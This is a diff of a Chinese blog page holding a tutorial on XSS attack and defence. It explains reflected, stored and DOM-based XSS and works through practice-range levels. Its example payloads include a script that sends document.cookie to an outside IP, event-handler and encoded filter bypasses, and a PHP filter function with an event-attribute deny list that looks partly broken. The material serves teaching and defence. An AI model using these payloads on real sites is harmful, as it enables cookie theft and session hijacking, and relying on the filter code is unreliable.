@@ -6,16 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | aprilwind`bolg</title>
+  <title>xss攻击与防守 | aprilwind`bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一个胆小却卑微的男孩子">
-<meta property="og:type" content="website">
-<meta property="og:title" content="aprilwind`bolg">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;index.html">
+  <meta name="description" content="什么是xss?   开放式Web应用程序安全项目（Open Web Application Security Project，OWASP）是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年和2010年统计过十大Web安全漏洞，如图下图所示：     我们看到xss高居第二！     除此之外在我们生活中也能经常看到很被攻击的：     跨站脚本（Cross-Site Scri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss攻击与防守">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;01&#x2F;xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88&#x2F;index.html">
 <meta property="og:site_name" content="aprilwind`bolg">
-<meta property="og:description" content="一个胆小却卑微的男孩子">
+<meta property="og:description" content="什么是xss?   开放式Web应用程序安全项目（Open Web Application Security Project，OWASP）是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年和2010年统计过十大Web安全漏洞，如图下图所示：     我们看到xss高居第二！     除此之外在我们生活中也能经常看到很被攻击的：     跨站脚本（Cross-Site Scri">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;actk_top.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;qq_mail_actk.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;goolge_actk.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;actk.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;ype.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;save_actk.jpg">
+<meta property="og:updated_time" content="2019-11-01T03:33:07.441Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;.com&#x2F;&#x2F;actk_top.jpg">
   
     <link rel="alternative" href="/atom.xml" title="aprilwind`bolg" type="application/atom+xml">
   
@@ -159,103 +167,352 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-xss攻击与防守" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      xss攻击与防守
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/" class="archive-article-date">
+
+        
+        <a href="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/" class="archive-article-date">
   	<time datetime="2019-11-01T03:31:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-01</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/">xss攻击与防守</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> 什么是xss?</p>
+<blockquote>
+<ul>
+<li>开放式Web应用程序安全项目（Open Web Application Security Project，OWASP）是世界上最知名的Web安全与数据库安全研究组织，该组织分别在2007年和2010年统计过十大Web安全漏洞，如图下图所示：<br><img src="/.com//actk_top.jpg" alt="avatar">    </li>
+<li>我们看到xss高居第二！    </li>
+<li>除此之外在我们生活中也能经常看到很被攻击的：<br><img src="/.com//qq_mail_actk.jpg" alt="avatar"><br><img src="/.com//goolge_actk.jpg" alt="avatar"></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在Web应用程序中的计算机安全漏洞，是由于Web应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码（通常包括HTML代码和客户端Javascript脚本）注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取Cookie资料窃取、会话劫持、钓鱼欺骗等各种攻击。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行，流程如图:</li>
+</ul>
+<p><img src="/.com//actk.jpg" alt="avatar"><br>###主要类型：</p>
+<ul>
+<li>Reflected XSS（基于反射的XSS攻击）</li>
+<li>Stored XSS（基于存储的XSS攻击）</li>
+<li>DOM-based or local XSS（基于DOM或本地的XSS攻击）</li>
+</ul>
+<p><em>按照攻击方式来分</em>：    </p>
+<p><img src="/.com//ype.png" alt="avatar"></p>
+<hr>
+<p>###Reflected XSS（基于反射的XSS攻击）:</p>
+<ul>
+<li><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。这种类型的跨站脚本是最常见，也是使用最广的一种，主要用于将恶意脚本附加到URL地址的参数中</p>
+</li>
+<li><p>此类 XSS 通常出现在网站的搜索栏、用户登入口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+</li>
+</ul>
+<p>exp:<br>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?" target="_blank" rel="noopener">简单的靶场</a><br>简单的跳转攻击：<br><code>&lt;/pre&gt;&lt;a href=&quot;http://www.xiaozhu.com/&quot;&gt;小姐姐&lt;/a&gt;&lt;pre&gt;</code></p>
+<p>简单的获取cookies：<br><code>&lt;script&gt;document.location=&#39;http://43.247.91.228:81/vulnerabilities/xss_r/?&#39;+document.cookie&lt;/script&gt;</code></p>
+<hr>
+<p>###Stored XSS（基于存储的XSS攻击）：</p>
+<ul>
+<li>持久型 XSS 一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在页面中，即在受害者主机上的浏览器执行恶意代码。<br>如图：</li>
+</ul>
+<p><img src="/.com//save_actk.jpg" alt="avatar">。  </p>
+<ul>
+<li>exp:   </li>
+<li>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?" target="_blank" rel="noopener">简单的靶场</a><br>简单的持久攻击：<br><code>小姐姐&lt;/div&gt;&lt;button type=&quot;button&quot;&gt;&lt;a href=&quot;http://www.xiaozhu.com/&quot;&gt;小姐姐&lt;/a&gt;&lt;/button&gt;</code></li>
+</ul>
+<hr>
+<p>###DOM-based or local XSS（基于DOM或本地的XSS攻击）:</p>
+<ul>
+<li><p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。所以他的攻击原理就和 Reflected XSS（基于反射的XSS攻击）一样了</p>
+</li>
+<li><p>exp:   </p>
+</li>
+<li><p>目标：<a href="http://43.247.91.228:81/vulnerabilities/xss_r/?" target="_blank" rel="noopener">简单的靶场</a><br>简单的DOM攻击：<br><code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;This is DOM XSS&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></p>
+</li>
+</ul>
+<hr>
+<p>###防御：</p>
+<ul>
+<li><p>要解决问题首先要知道问题是怎么产生的，所以这里我们来详细的看看不同种类的攻击是如何工作的。</p>
+</li>
+<li><p>在前面我们说到了，反射型的攻击是最为常见的，相对于其他的两种类型的攻击来说的话在技能上要求也是比较简单的。我们就来详细的看看是如何工作的：    </p>
+</li>
+<li><p>目标：<a href="http://xss.fbisb.com/yx/level1.php?name=test" target="_blank" rel="noopener">简单的靶场2</a> </p>
+</li>
+</ul>
+<p>新手村卡拉赞：  </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level1.php?name=test" target="_blank" rel="noopener">简单的靶场2</a><br><code>&lt;script&gt;alert()&lt;/script&gt;</code></li>
+</ul>
+<p>怒焰裂谷:  </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level2.php?name=test" target="_blank" rel="noopener">简单的靶场2</a><br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></li>
+</ul>
+<p>哀嚎洞穴：  </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level4.php?name=test" target="_blank" rel="noopener">简单的靶场2</a><br><code>&quot; οnclick=alert() type=&quot;</code></li>
+</ul>
+<blockquote>
+<p>这里我们就进入了事件攻击类型了，但是任然属于反射xss</p>
+</blockquote>
+<p>影牙城堡:   </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level5.php?keyword=" target="_blank" rel="noopener">简单的靶场2</a><br><code>&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;</code></li>
+</ul>
+<p>黑暗深渊：  </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level6.php?keyword=" target="_blank" rel="noopener">简单的靶场2</a><br><code>&quot; /&gt;&lt;a hrEF=javascript:alert()&gt;something&lt;/a&gt;</code><blockquote>
+<p>这里我们就开始遇到关键词的替换了</p>
+</blockquote>
+</li>
+</ul>
+<p>诺莫瑞根：  </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level7.php?keyword=move%20up!" target="_blank" rel="noopener">简单的靶场2</a> <blockquote>
+<p>在这个副本中我们就能看到这里也是对关键词进行替换。<br>这里我们将被替换的关键词进行编码，这里主要是进行了十进制编码，同样的我们可以使用十六进制进行编码和其他的，这里我们需要查看具体支持那些编码。<br><code>javascrip&amp;#116:alert()</code><br>_sort=” type=”text” οnclick=alert() “`</p>
+</blockquote>
+</li>
+</ul>
+<p>沉没的神庙:    </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level10.php?keyword=move%20up!" target="_blank" rel="noopener">简单的靶场2</a><br><code>t_sort=&quot; type=&quot;text&quot; οnclick=alert() &quot;</code><blockquote>
+<p>在这里我们就开始对网站的规则进行猜测，这个在很多的大型网站中是很难找到具体的规则。</p>
+</blockquote>
+</li>
+</ul>
+<p>黑石深渊：    </p>
+<ul>
+<li>目标：<a href="http://xss.fbisb.com/yx/level11.php?keyword=move%20up!" target="_blank" rel="noopener">简单的靶场2</a>  <blockquote>
+<p>这里我们就是注入型的xss，xss的攻击就主要变成了地请求的串改了。当然不止是对referer的攻击，还有可能对UA,cookies，uri等。</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+</blockquote>
+<p>当然我们这里只是把各种xss的方式展现给大家了，很多地方都是需要我们自己去动手详细的去操作，并找到更多的攻击方并了解攻击原理，这样我们才能很好的预防和完善我们的程序。</p>
+<blockquote>
+<p>###进阶攻击：</p>
+<ul>
+<li>session劫持：<br>Session 的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是基于访问的进程，记录了一个访问的开始到结束，当浏览器或进程关闭之后，Session也就“消失”了。<br>在Session机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也会有被其他人利用的可能。<br>Session和Cookie的最大区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>XSS 蠕虫:<br>持久型XSS不需要用户去单击URL进行触发，所以它的危害比反射型XSS大，黑客可以利用它渗透网站、挂马、钓鱼……<br>更严重的是，利用此类 XSS 能够轻易编写危害性更大的 XSS 蠕虫，跨站蠕虫是使用Ajax/JavaScript脚本语言编写的蠕虫病毒，能够在网站中实现病毒的几何数级传播，其感染速度和攻击效果都非常可怕。XSS蠕虫会直接影响到网站的所有用户，也就是一个地方出现XSS漏洞，同站点下的所有用户都可能被攻击。可想而知XSS蠕虫对网站的打击是十分巨大的！</li>
+<li><a href="https://www.2cto.com/article/201609/545085.html" target="_blank" rel="noopener">https://www.2cto.com/article/201609/545085.html</a>  </li>
+</ul>
+<hr>
+<ul>
+<li>兄弟们，讲到这里了，还不点…………,嗯，我来看看需要这么做来应对，<br>在上面点打副本中我们已经知道了一些防御点手段这里来这个一个总结和发散：      </li>
+</ul>
+<blockquote>
+<p>表单数据指定值的类型;过滤或移除特殊的 html 标签; 过滤 js 事件的标签。<br>千言万语汇成一句简单的代码：</p>
+</blockquote>
+<p><code>function filter_xss($string, $allowedtags = &#39;&#39;, $disabledattributes = array(&#39;onabort&#39;,
+&#39;onactivate&#39;, &#39;onafterprint&#39;, &#39;onafterupdate&#39;, &#39;onbeforeactivate&#39;, &#39;onbeforecopy&#39;,
+&#39;onbeforecut&#39;, &#39;onbeforedeactivate&#39;, &#39;onbeforeeditfocus&#39;, &#39;onbeforepaste&#39;,
+&#39;onbeforeprint&#39;,&#39;onbeforeunload&#39;, &#39;onbeforeupdate&#39;, &#39;onblur&#39;, &#39;onbounce&#39;,
+&#39;oncellchange&#39;, &#39;onchange&#39;, &#39;onclick&#39;, &#39;oncontextmenu&#39;, &#39;oncontrolselect&#39;, &#39;oncopy&#39;,
+&#39;oncut&#39;, &#39;ondataavaible&#39;, &#39;ondatasetchanged&#39;, &#39;ondatasetcomplete&#39;, &#39;ondblclick&#39;,
+&#39;ondeactivate&#39;, &#39;ondrag&#39;, &#39;ondragdrop&#39;, &#39;ondragend&#39;, &#39;ondragenter&#39;, &#39;ondragleave&#39;,
+&#39;ondragover&#39;, &#39;ondragstart&#39;, &#39;ondrop&#39;, &#39;onerror&#39;, &#39;onerrorupdate&#39;, &#39;onfilterupdate&#39;,
+&#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;&#39;onfinish&#39;, &#39;onfocus&#39;, &#39;onfocusin&#39;, &#39;onfocusout&#39;, &#39;onhelp&#39;, &#39;onkeydown&#39;, &#39;onkeypress&#39;,
+&#39;onkeyup&#39;, &#39;onlayoutcomplete&#39;, &#39;onload&#39;, &#39;onlosecapture&#39;, &#39;onmousedown&#39;, &#39;onmouseenter&#39;,
+&#39;onmouseleave&#39;, &#39;onmousemove&#39;, &#39;onmoveout&#39;, &#39;onmouseover&#39;, &#39;onmouseup&#39;, &#39;onmousewheel&#39;,
+&#39;onmove&#39;,&#39;onmoveend&#39;, &#39;onmovestart&#39;, &#39;onpaste&#39;, &#39;onpropertychange&#39;,
+&#39;onreadystatechange&#39;, &#39;onreset&#39;, &#39;onresize&#39;, &#39;onresizeend&#39;, &#39;onresizestart&#39;, &#39;onrowexit&#39;,
+&#39;onrowsdelete&#39;, &#39;onrowsinserted&#39;, &#39;onscroll&#39;, &#39;onselect&#39;, &#39;onselectionchange&#39;,
+&#39;onselectstart&#39;, &#39;onstart&#39;, &#39;onstop&#39;, &#39;onsubmit&#39;, &#39;onunload&#39;))
+{
+ if(is_array($string))
+ {
+   foreach($string as $key =&gt; $val) $string[$key] = filter_xss($val, ALLOWED_HTM-
+LTAGS);
+ }
+ else
+ {
+   $string = preg_replace(&#39;/\s(&#39;.implode(&#39;|&#39;, $disabledattributes).&#39;).*?([\s\&gt;])/&#39;,
+&#39;\\2&#39;, preg_replace(&#39;/&lt;(.*?)&gt;/ie&#39;, &quot;&#39;&lt;&#39;.preg_replace(array(&#39;/javascript:[^\&quot;\&#39;]*/i&#39;,
+&#39;/(&quot;.implode(&#39;|&#39;, $disabledattributes).&quot;)[ \\t\\n]*=[ \\t\\n]*[\&quot;\&#39;][^\&quot;\&#39;]*[\&quot;\&#39;]/i&#39;,
+&#39;/\s+/&#39;), array(&#39;&#39;, &#39;&#39;, &#39; &#39;), stripslashes(&#39;\\1&#39;)) . &#39;&gt;&#39;&quot;, strip_tags($string,
+$allowedtags)));
+ }
+  return $string;
+}</code></p>
+</blockquote>
+<blockquote>
+<p>这段代码的作用是过滤XSS跨站代码，整个功能封装在filter_xss()中，只要程序在处理输入变量的时候使用该函数，就足以过滤常见的跨站脚本。 </p>
+<hr>
+<p>当然除了对我们的代码进行规范意外，还要对已有的代码进行测试检查这里我们能在github上找到一些开源的工具：</p>
+<p><a href="https://github.com/s0md3v/XSStrike.git" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike.git</a><br>工具提供很多测试方法，脚本关键词扫描，事件扫描，DOM扫描等；</p>
+<ul>
+<li><p>代码审计：<br>除了使用工具测试意外，还要我们自己定期的审计代码；理论上来讲，如果想要尽可能挖掘更多的XSS漏洞，最可靠的方式是进行Web代码安全审计，即审计、检查程序源代码中的缺点和错误信息，分析并找到这些问题引发的安全漏洞。这里的源代码是指Web服务器端的程序代码，如ASP、JSP、PHP等。<br>众所周知，XSS跨站的原理是向HTML中注入并执行恶意脚本，和大多数的Web安全漏洞一样，它同样是由于不正确的输入输出验证所造成的。归根结底，XSS的产生来自于服务端，所以想彻底杜绝XSS攻击，就必须从服务端程序着手，而进行Web代码安全审计来发掘XSS无疑是最有效的解决方式之一。<br>分析源代码发掘 XSS 的思路一般是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤。<br>HtmlEncode函数的作用是将HTML源文件中不允许出现的字符进行编码，通常是编码以下字符”&lt;”、”&gt;”、”&amp;” 等，许多程序语言都内置相应的函数或库实现该功能，如ASP的Server.HTMLEncode方法和PHP的htmlspecialchars()函数。</p>
+</li>
+<li><p>黑盒测试：<br>不管是采用哪种方式进行 Web 安全测试，都要依照测试者所能取得的相关资源而定，如：白盒测试适用于取得相应的源代码等资源时；黑盒测试则适用于完全无法取得前述资源，只能从程式外部输入可能接收的文件或参数值、并观察其输出结果时；而灰箱测试的适用条件则界于白盒测试与黑盒测试之间。<br>其中，黑盒测试中又可分为人工测试及自动化测试，所谓的“自动化测试”就是指使用自动化测试工具来进行测试，这类测试一般不需要人干预。<br>下面介绍几款可以扫描 XSS 漏洞的自动化测试工具，有了这些工具，便能快速有效地发掘出Web应用程序中的跨站脚本漏洞。<br>Acunetix Web Vulnerability Scanner。<br>Acunetix Web Vulnerability Scanner是一款商业级的Web漏洞扫描程序，它的功能非常强大，可以自动化检测各种Web应用程序中的漏洞，包括XSS、SQL 注入、代码执行、目录遍历、网站程序源代码暴露、CRLF Injection等。<br>读者可以从官方网站获取更多信息：<br><a href="http://www.acunetix.com/vulnerability-scanner。" target="_blank" rel="noopener">http://www.acunetix.com/vulnerability-scanner。</a></p>
+</li>
+<li><p>当然开源的肯定没有付费的好，不管是国内还是国外都会有很多提供这方面服务的公司，只要钱到位，就是出问题都会有人帮你弄，</p>
+</li>
+</ul>
+</blockquote>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>可怜可怜，买点防脱发水吧！<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/zhifuma.JPG">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/01/xss%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/01/xss%E6%94%BB%E5%87%BB/" class="archive-article-date">
-  	<time datetime="2019-11-01T03:05:19.497Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-01</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/01/xss%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">xss攻击</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/01/xss%E6%94%BB%E5%87%BB/">xss攻击</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    目录，不存在的…
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/20/Eric_Ding_hello-world/" class="archive-article-date">
-  	<time datetime="2019-10-20T05:03:40.139Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-20</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/20/Eric_Ding_hello-world/">Eric_Ding_hello-world</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -278,8 +535,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
